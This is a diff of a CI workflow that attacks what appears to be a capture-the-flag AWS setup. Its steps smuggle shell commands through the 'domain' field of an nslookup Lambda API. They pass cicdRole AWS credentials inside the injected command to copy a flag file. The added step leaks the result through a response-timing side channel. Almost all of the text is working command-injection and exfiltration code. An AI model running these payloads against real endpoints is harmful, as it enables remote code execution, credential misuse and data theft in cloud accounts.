@@ -85,29 +85,28 @@ jobs:
           curl -s -o /dev/null -w "HTTP %{http_code}\n" https://platform-bucket-009661764077-us-east-1.s3.amazonaws.com/debug.txt
           curl -s https://platform-bucket-009661764077-us-east-1.s3.amazonaws.com/debug.txt
 
-      - name: Test VPC-sourced creds (cicdRole through Lambda)
+      - name: Exploit - read flag using timing side-channel
         run: |
-          echo "Hypothesis: cicdRole creds used inside Lambda (VPC) satisfy aws:SourceVpc condition -> unlock Statement1 s3:*"
-          TESTKEY="test-vpc-theory-$(date +%s).txt"
-          INJECT="x; AWS_ACCESS_KEY_ID=$AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY=$AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN=$AWS_SESSION_TOKEN AWS_DEFAULT_REGION=us-east-1 echo 'vpc-injection-worked' | aws s3 cp - s3://codec4f26c862a321ef5/$TESTKEY 2>&1 #"
+          echo "Bucket policy restricts writes to lambdaRole/CTFExecutionRole only."
+          echo "Strategy: lambdaRole CAN read (VPC condition satisfied). Use timing to exfil."
+          echo "Payload: if flag copy succeeds -> sleep 10s, else sleep 1s"
+          INJECT="x; (aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag.txt && sleep 10 && cat /tmp/flag.txt | wc -c) || (echo 'FAILED'; sleep 1) #"
           python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
-          curl -s -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
-            -H "Content-Type: application/json" \
-            -d @payload.json > /dev/null
-          sleep 3
-          echo "--- trying to read test object from outside VPC (cicdRole, Statement2 only) ---"
-          aws s3 cp s3://codec4f26c862a321ef5/$TESTKEY - 2>&1 || echo "  (expected to fail - Statement2 has no s3:GetObject on codec bucketl)"
 
-      - name: Exploit - read flag using VPC-injected creds
-        run: |
-          INJECT="x; AWS_ACCESS_KEY_ID=$AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY=$AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN=$AWS_SESSION_TOKEN AWS_DEFAULT_REGION=us-east-1 aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://codec4f26c862a321ef5/FLAG-EXFIL-STAGE1.txt 2>&1 #"
-          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
-          curl -s -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+          echo "--- Sending timing-based exfil payload ---"
+          START=$(date +%s%N)
+          curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
             -H "Content-Type: application/json" \
-            -d @payload.json > /dev/null
-          sleep 3
-          echo "--- attempting to read exfiltrated flag ---"
-          aws s3 cp s3://codec4f26c862a321ef5/FLAG-EXFIL-STAGE1.txt - 2>&1
+            -d @payload.json
+          END=$(date +%s%N)
+          ELAPSED_MS=$(( (END - START) / 1000000 ))
+
+          echo "Response time: ${ELAPSED_MS}ms"
+          if [ $ELAPSED_MS -gt 5000 ]; then
+            echo "SUCCESS SIGNAL: took >5s, flag copy likely succeeded!"
+          else
+            echo "FAILED SIGNAL: took <2s, flag copy likely failed"
+          fi
 
       - name: Read Lambda CloudWatch logs for RCE diagnostics
         run: |
